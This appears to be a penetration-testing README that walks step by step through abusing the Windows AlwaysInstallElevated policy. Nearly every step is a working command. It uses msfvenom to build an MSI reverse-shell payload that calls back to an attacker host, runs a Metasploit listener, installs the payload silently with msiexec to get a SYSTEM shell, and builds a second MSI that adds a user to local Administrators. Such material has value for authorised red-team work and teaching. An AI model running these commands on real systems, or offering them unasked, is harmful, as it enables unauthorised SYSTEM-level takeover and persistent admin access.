# AlwaysInstallElevated: Privilege Escalation

**MSI packages** can be installed with **elevated privileges** by non-admin users.

## Get an elevated reverse shell

1. Generate an **MSI payload** to get an elevated **reverse shell**

        msfvenom -p windows/shell/reverse_tcp LHOST=<Local IP Address> LPORT=4444 -f msi > elevated_shell.msi

2. Use `exploit/multi/handler` metasploit module to start a listener

        msfconsole
        use exploit/multi/handler
        set payload windows/shell/reverse_tcp
        set LHOST <Local IP Address>
        set LPORT 4444
        run

3. Run following command to execute the malicious Windows Installer file

        msiexec /q /i .\elevated_shell.msi

4. Confirm if the privileges got escalated successfully by running `whoami`

        C:\Windows\system32>whoami
        whoami
        nt authority\system

## Add local admin privileges

1. Verify whether the Windows installer has elevated privileges or not

        reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
        reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

    “AlwaysInstallElevated” registry with a dword (REG_WORD) value of **0x1** means that the AlwaysInstallElevated policy is enabled.

2. Select a non-admin user

        net user
        net user USERNAME

3. Generate an MSI payload to add local admin privileges for an existing non-admin user account

        msfvenom -p windows/exec CMD='net localgroup administrators USERNAME /add' -f msi > pwn.msi

4. [Transfer the payload](../../windows_post_exploitation/file_transfer_smbserver/README.md) to victim's machine
5. Execute the installer

        msiexec /quiet /qn /i pwn.msi

6. Verify if the selected user was successfully added to Local Administrators group

        net user USERNAME

    You should see the following output:

        ...
        Local Group Memberships      *Administrators
        ...

## References

* https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/
* https://www.hackingarticles.in/bypass-application-whitelisting-using-msiexec-exe-multiple-methods/
* https://docs.microsoft.com/en-us/windows/win32/msi/command-line-options
* https://www.tutorialspoint.com/get-the-reverse-shell-with-msi-package
* https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/